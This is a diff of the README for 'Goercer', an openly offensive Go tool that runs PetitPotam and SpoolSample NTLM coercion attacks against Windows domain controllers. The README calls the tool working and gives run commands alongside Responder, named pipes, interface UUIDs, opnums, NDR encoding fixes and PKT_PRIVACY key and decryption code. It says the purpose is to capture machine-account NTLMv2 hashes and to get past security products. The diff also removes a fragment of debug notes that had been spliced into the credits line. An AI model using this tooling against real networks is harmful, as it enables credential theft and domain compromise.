@@ -1,10 +1,14 @@
-# Goercer - PetitPotam PoC with DCERPC PKT_PRIVACY
+# Goercer - NTLM Coercion Attack Tool
 
-A Go implementation of the PetitPotam NTLM coercion attack using **DCERPC authentication level 6 (PKT_PRIVACY)** with full encryption and signing.
+A Go implementation of NTLM coercion attacks using **DCERPC authentication level 6 (PKT_PRIVACY)** with full encryption and signing. Supports multiple coercion methods including PetitPotam and SpoolSample.
 
 ## ✅ Status: **WORKING**
 
 Successfully coerces Windows domain controllers to authenticate to an attacker-controlled listener, capturing the machine account NTLMv2 hash.
+
+**Supported Methods**:
+- ✅ **PetitPotam** (MS-EFSRPC) - 1 callback
+- ✅ **SpoolSample** (MS-RPRN) - 3 callbacks
 
 **Tested Against**: Windows Server 2019 Domain Controller (10.1.1.14 / DESKTOP-NL7DJHI)
 **Result**: ✅ Machine account hash captured via Responder
@@ -13,21 +17,46 @@ Successfully coerces Windows domain controllers to authenticate to an attacker-c
 
 ```bash
 go build -o goercer goercer_full.go
-./goercer <target_dc> <listener_ip> <username> <password> <domain>
+./goercer <target_dc> <listener_ip> <username> <password> <domain> <method>
 ```
 
-**Example**:
+**Methods**: `petitpotam` or `spoolsample`
+
+**Examples**:
 
 ```bash
-
 # Terminal 1: Start Responder
 sudo responder -I eth0 -v
 
-# Terminal 2: Run the attack
-./goercer <target_dc> <listener_ip> <username> <password> <domain>
+# Terminal 2: Run PetitPotam (1 callback)
+./goercer <target_dc> <listener_ip> <username> <password> <domain> petitpotam
+
+# Or run SpoolSample (3 callbacks)
+./goercer <target_dc> <listener_ip> <username> <password> <domain> spoolsample
 ```
 
-Common Errors and Solutions**:
+## Attack Methods
+
+### PetitPotam (MS-EFSRPC)
+- **Pipe**: `\pipe\lsarpc`
+- **UUID**: `c681d488-d850-11d0-8c52-00c04fd90f7e` v1.0
+- **Opnums**: 0 (EfsRpcOpenFileRaw - often patched), 4 (EfsRpcEncryptFileSrv - working)
+- **Callbacks**: 1 authentication attempt
+- **Target Parameter**: UNC path in MS-EFSRPC function calls
+
+### SpoolSample (MS-RPRN)
+- **Pipe**: `\pipe\spoolss`
+- **UUID**: `12345678-1234-abcd-ef00-0123456789ab` v1.0
+- **Opnums**: 
+  - 1 (RpcOpenPrinter - opens printer handle)
+  - 65 (RpcRemoteFindFirstPrinterChangeNotificationEx)
+  - 62 (RpcRemoteFindFirstPrinterChangeNotification)
+- **Callbacks**: 3 authentication attempts
+- **Target Parameter**: `pszLocalMachine` in notification functions
+
+Both methods trigger the target DC to authenticate to the attacker's listener, capturing the machine account NTLMv2 hash.
+
+## Common Errors and Solutions
 
 1. **ACCESS_DENIED (0x00000005)**
    - **Cause**: Missing `NTLMSSP_NEGOTIATE_TARGET_INFO` or `NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY` in Type 1
@@ -41,17 +70,9 @@ Common Errors and Solutions**:
    - **Cause**: Using `\pipe\efsrpc` with `df1941c5-fe89-4e79-bf10-463657acf44d`
    - **Fix**: Use `\pipe\lsarpc` with `c681d488-d850-11d0-8c52-00c04fd90f7e`
 
-4. **Wrong NTLMv2 identity**
-   - **Cause**: Uppercasing both user and domain
-   - **Fix**: Only uppercase the username: `uppercase(user) + domain`
-
-5. **Domain name in Authenticate message**
-   - **Cause**: Uppercasing domain in Type 3
-   - **Fix**: Send domain as-is (not uppercased) in UTF-16LE
-
----
-
-## Python Reference (impacket PetitPotam
+4. **ERROR_BAD_NETPATH in SpoolSample (0x6f7)**
+   - **Cause**: Missing NDR referent ID for unique pointer in RpcOpenPrinter
+   - **Fix**: Add `0x00020000` referent ID before `pPrinterName` string
 
 ---
 
@@ -83,10 +104,12 @@ The attack **requires** these specific NTLM flags to be set correctly:
 1. **SMB Connection** (`github.com/jfjallid/go-smb/smb`)
    - Connect to `\\target\IPC$`
    - NTLM authentication at SMB layer
-   - Open named pipe: `\pipe\lsarpc` (NOT `\pipe\efsrpc`)
+   - Open named pipe based on method:
+     - PetitPotam: `\pipe\lsarpc`
+     - SpoolSample: `\pipe\spoolss`
 
 2. **DCERPC Bind**
-   - UUID: `c681d488-d850-11d0-8c52-00c04fd90f7e` (lsarpc interface)
+   - Method-specific UUID and version
    - Authentication: NTLM with PKT_PRIVACY (level 6)
    - 3-way handshake: Bind → BindAck → Auth3
 
@@ -102,19 +125,50 @@ The attack **requires** these specific NTLM flags to be set correctly:
 
 4. **DCERPC Encryption (PKT_PRIVACY)**
    - Session key derivation with KEY_EXCH
-   - Sign key: `MD5(sessionKey + "session key to client-to-server signing key magic constant\x00")`
-   - Seal key: `MD5(sessionKey + "session key to client-to-server sealing key magic constant\x00")`
+   - Client keys: `MD5(sessionKey + "...client-to-server...magic constant\x00")`
+   - Server keys: `MD5(sessionKey + "...server-to-client...magic constant\x00")`
    - **Critical**: RC4 cipher is continuous stream (never reset between messages)
    - **Encryption order**: Encrypt stub FIRST, then sign (signature encrypts checksum)
+   - **Response decryption**: Extract encrypted stub, decrypt with server RC4 handle
 
-5. **MS-EFSRPC Call**
-   - Function: `EfsRpcOpenFileRaw` (opnum 0) or `EfsRpcEncryptFileSrv` (opnum 4)
+5. **Coercion Execution**
+   
+   **PetitPotam**:
+   - Call MS-EFSRPC functions (opnum 0 or 4)
    - Parameter: UNC path to attacker's listener (`\\10.1.1.99\test\Settings.ini`)
-   - Server attempts to access UNC path, triggering NTLM authentication to listener
+   - Server attempts to access UNC path, triggering NTLM authentication
+   
+   **SpoolSample**:
+   - Step 1: RpcOpenPrinter (opnum 1) to get printer handle
+   - Step 2: Call notification functions (opnum 65 and 62)
+   - Parameter: `pszLocalMachine` pointing to attacker's listener (`\\10.1.1.99`)
+   - Each notification triggers authentication attempt
 
 ---
 
 ## Key Technical Details
+
+### Extensible Architecture
+
+The codebase uses a `CoercionMethod` struct pattern for easy addition of new methods:
+
+```go
+type CoercionMethod struct {
+    Name         string
+    PipeName     string
+    UUID         string
+    MajorVersion uint16
+    MinorVersion uint16
+    Opnums       []uint16
+    CreateStub   func(string, []byte) []byte
+}
+```
+
+**Adding new methods** requires:
+1. Define new CoercionMethod with pipe, UUID, opnums
+2. Implement stub builder function
+3. Create execute function following PetitPotam/SpoolSample pattern
+4. Add switch case in main()
 
 ### Why PKT_PRIVACY (Level 6)?
 
@@ -124,6 +178,44 @@ Most PetitPotam implementations use unauthenticated DCERPC. This implementation 
 - Learning NTLM encryption/signing implementation
 - Demonstrating encryption doesn't prevent coercion
 - Bypassing potential security products that block unauthenticated RPC
+
+### Critical SpoolSample Implementation: NDR Encoding
+
+SpoolSample required solving **NDR (Network Data Representation) encoding** for RpcOpenPrinter:
+
+**The Problem**: `pPrinterName` is `STRING_HANDLE` which equals `LPWSTR` (unique pointer in NDR).
+
+**NDR Rule**: All unique pointers require a 4-byte **referent ID** before the pointed-to data.
+
+**The Fix**:
+```go
+// Correct - referent ID first
+binary.Write(&buf, binary.LittleEndian, uint32(0x00020000)) // Referent ID
+binary.Write(&buf, binary.LittleEndian, lenChars)  // Then conformant varying string
+```
+
+Without the referent ID: `ERROR_BAD_NETPATH (0x6f7)`
+With the referent ID: Success, returns 20-byte `PRINTER_HANDLE`
+
+### Response Decryption (PKT_PRIVACY)
+
+Server responses in PKT_PRIVACY mode are encrypted and require decryption:
+
+```go
+// Server keys calculated with mode='Server'
+auth.serverSignKey = calculateSignKey(exportedSessionKey, false)
+auth.serverSealKey = calculateSealKey(exportedSessionKey, false)
+auth.serverSealHandle, _ = rc4.NewCipher(auth.serverSealKey)
+
+// Decryption process
+authTrailerStart := fragLen - authLen - 8
+encryptedStub := response[24:authTrailerStart] // Between header and trailer
+auth.serverSealHandle.XORKeyStream(decryptedStub, encryptedStub)
+```
+
+**Structure**: DCERPC header (24) + encrypted stub + padding + auth trailer (8 + authLen)
+
+**Note**: Fault responses have `authLen=0` (unencrypted).
 
 ### NTLMv2 Hash Calculation
 
@@ -305,26 +397,29 @@ This implementation uses `WritePipe` instead of `Transceive` for Auth3 because:
 ## References
 
 - **MS-EFSR**: Encrypting File System Remote (EFSRPC) Protocol
+- **MS-RPRN**: Print System Remote Protocol
 - **MS-RPCE**: Remote Procedure Call Protocol Extensions  
 - **MS-NLMP**: NT LAN Manager (NTLM) Authentication Protocol
 - **PetitPotam**: Original PoC by @topotam77
+- **SpoolSample**: Print spooler coercion technique
 - **impacket**: Python implementation reference
+- **Coercer**: Multi-method coercion tool by @p0dalirius
 
 ---
 
 ## Complete Working Solution Summary
 
-After extensive debugging and analysis comparing with Python impacket, the following issues were identified and fixed:
+After extensive debugging and analysis comparing with Python impacket and Coercer, the following critical fixes were required:
 
-### Critical Fixes Required
+### Critical Fixes
 
-1. **Type 1 Flags** ⚠️ MOST CRITICAL
+1. **Type 1 Flags** ⚠️ MOST CRITICAL (PetitPotam)
    - **Problem**: Missing `NTLMSSP_NEGOTIATE_TARGET_INFO` (0x00800000) and `NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY` (0x00080000)
    - **Impact**: Windows rejected authentication with ACCESS_DENIED before attempting coercion
    - **Fix**: Add both flags to Type 1 Negotiate message
    - **Lesson**: These flags signal NTLMv2 intent to server - without them, server rejects at NTLM layer
 
-2. **Pipe and UUID**
+2. **Pipe and UUID** (PetitPotam)
    - **Problem**: Using `\pipe\efsrpc` with UUID `df1941c5-fe89-4e79-bf10-463657acf44d`
    - **Impact**: Wrong interface binding
    - **Fix**: Use `\pipe\lsarpc` with UUID `c681d488-d850-11d0-8c52-00c04fd90f7e`
@@ -336,44 +431,51 @@ After extensive debugging and analysis comparing with Python impacket, the follo
    - **Fix**: Only uppercase username: `uppercase(user) + domain`
    - **Lesson**: MS-NLMP spec and impacket only uppercase the user component
 
-4. **Domain Name in Type 3**
-   - **Problem**: Sending uppercased domain in Authenticate message
-   - **Impact**: Signature/MIC validation failures
-   - **Fix**: Send domain as-is (not uppercased) in UTF-16LE
-   - **Lesson**: Type 3 domain field should preserve original casing
-
-5. **RC4 Cipher Continuity**
+4. **RC4 Cipher Continuity**
    - **Problem**: Creating new RC4 cipher for each request
    - **Impact**: Encryption keystream out of sync, decryption failures
    - **Fix**: Initialize RC4 once, reuse same cipher handle for all operations
    - **Lesson**: RC4 is a stream cipher - state must persist across all encryptions
 
-6. **Encryption Order**
+5. **Encryption Order**
    - **Problem**: Signing before encrypting, or encrypting then signing separately
    - **Impact**: RC4 keystream bytes consumed in wrong order
    - **Fix**: Encrypt stub first, THEN sign (signature encrypts checksum with continued stream)
    - **Lesson**: impacket's SEAL function shows exact order - stub uses bytes 0..N, checksum uses N+1..N+8
 
+6. **NDR Referent ID** ⚠️ CRITICAL FOR SPOOLSAMPLE
+   - **Problem**: Missing 4-byte referent ID for unique pointer in RpcOpenPrinter
+   - **Impact**: ERROR_BAD_NETPATH (0x6f7), RpcOpenPrinter failed
+   - **Fix**: Add referent ID `0x00020000` before `pPrinterName` string
+   - **Lesson**: `STRING_HANDLE = LPWSTR = unique pointer` in NDR requires referent ID before data
+
+7. **Server-Side Crypto Keys** (Response Decryption)
+   - **Problem**: Only had client keys, couldn't decrypt server responses
+   - **Impact**: Could send encrypted requests but not decrypt responses
+   - **Fix**: Calculate server keys with `mode='Server'` (false parameter), add serverSealHandle
+   - **Lesson**: PKT_PRIVACY requires both directions - client keys for requests, server keys for responses
+
 ### Verification Steps
 
-To verify each fix:
-
 ```bash
-# 1. Check NTLM flags in Wireshark
-# Type 1 should show: TARGET_INFO, EXTENDED_SESSIONSECURITY flags set
+# 1. Build
+go build -o goercer goercer_full.go
 
-# 2. Verify pipe and UUID
-# Should see: \pipe\lsarpc and UUID c681d488-d850-11d0-8c52-00c04fd90f7e
+# 2. Start Responder
+sudo responder -I eth0 -v
 
-# 3. Check NTLMv2 response
-# Response length should be ~302 bytes (not 330)
+# 3. Test PetitPotam
+./goercer <target_dc> <listener_ip> <username> <password> <domain> petitpotam
+# Should see: 1 callback in Responder
 
-# 4. Monitor Responder
-# Should receive callback from target DC
-# Captures: DESKTOP-NL7DJHI$::splat:...(NTLMv2 hash)
+# 4. Test SpoolSample  
+./goercer <target_dc> <listener_ip> <username> <password> <domain> spoolsample
+# Should see: 3 callbacks in Responder
 
-# 5. Check DCERPC responses
-# Should get type 0x02 (Response), not 0x03 (Fault)
+# 5. Verify with Coercer (optional comparison)
+cd Coercer
+./Coercer.py coerce -t <target_dc> -d <domain> -u <username> -l <listener_ip> --filter-pipe-name spoolss
+# Should also see: 3 callbacks (validates goercer behavior)
 ```
 
 ### Testing
@@ -382,11 +484,16 @@ To verify each fix:
 # Terminal 1: Responder
 sudo responder -I eth0 -v
 
-# Terminal 2: Attack
+# Terminal 2: Build and run
 go build -o goercer goercer_full.go
-./goercer <target_dc> <listener_ip> <username> <password> <domain>
 
-# Expected output:
+# PetitPotam (1 callback)
+./goercer <target_dc> <listener_ip> <username> <password> <domain> petitpotam
+
+# SpoolSample (3 callbacks)
+./goercer <target_dc> <listener_ip> <username> <password> <domain> spoolsample
+
+# Expected output (both methods):
 # [+] DCERPC authentication complete!
 # [+] Check Responder for callback!
 
@@ -457,27 +564,8 @@ Without these methods, the code would need to use low-level IOCTL calls directly
 ## Credits
 
 - **@topotam77**: Original PetitPotam discovery and PoC
-- **impacket team**: Reference NTLM/DCERPC implementation that made this possible
+- **@p0dalirius**: Coercer multi-method implementation and validation
+- **Lee Christensen (@tifkin_)**: SpoolSample/PrinterBug discovery
+- **impacket team**: Reference NTLM/DCERPC implementation
 - **go-smb** (jfjallid): Go SMB client library [go-smb](https://github.com/jfjallid/go-smb)
-- **MS-EFSR, MS-RPCE, MS-NLMP**: Microsoft protocol specificationstargetInfo, and temp blob goes into ntlmv2Resp - verify nothing is corrupting this chain
-**Compare with Python**: Python's working implementation (frame 80 in capthatbooty.pcapng) has 302-byte NTLM response without Flags/Channel Bindings - our code SHOULD match this
-
-**Files to Check**:
-
-- `goercer_full.go` lines 305-360: createNTLMAuthenticate function
-- `goercer_full.go` lines 576-585: buildTempBlob function  
-- `goercer_full.go` lines 624-668: addTargetNameToAVPairs function (filtering happens here)
-
-**Debug Artifacts**:
-
-- `/tmp/targetinfo_debug.bin`: Contains correct filtered targetInfo (254 bytes, no Flags/Channel Bindings)
-- `go12.pcapng`: Shows NTLM Authenticate with unfiltered data (330 bytes, has Flags/Channel Bindings)
-- `capthatbooty.pcapng`: Python's working capture for reference
-
-**Test Command**:
-
-```bash
-cd /path/to/goercer
-./goercer_full <target_dc> <listener_ip> <username> <password> <domain>
-# Check /tmp/targetinfo_debug.bin and compare with packet capture
-```
+- **Microsoft**: Protocol specifications (MS-EFSR, MS-RPRN, MS-RPCE, MS-NLMP)
